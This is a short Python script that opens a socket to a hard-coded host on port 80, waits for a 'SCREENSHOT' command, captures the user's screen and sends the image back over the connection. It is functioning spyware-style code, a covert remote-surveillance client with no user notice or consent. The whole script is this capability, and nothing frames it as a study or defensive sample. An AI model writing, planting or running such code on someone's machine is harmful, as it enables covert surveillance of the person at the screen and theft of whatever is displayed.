import socket
import win32com.client
from PIL import ImageGrab

# TCP/UDP
serv = socket.socket()
serv.connect(("192.168.1.64",80)) # input("Enter host addr: ")

while True:
    Message = serv.recv(10)
    if b"SCREENSHOT" in Message:
        file = ImageGrab.grab().convert("1").save("client.png")
        file = open("client.png", "rb").read()
        serv.send(file + b"END")
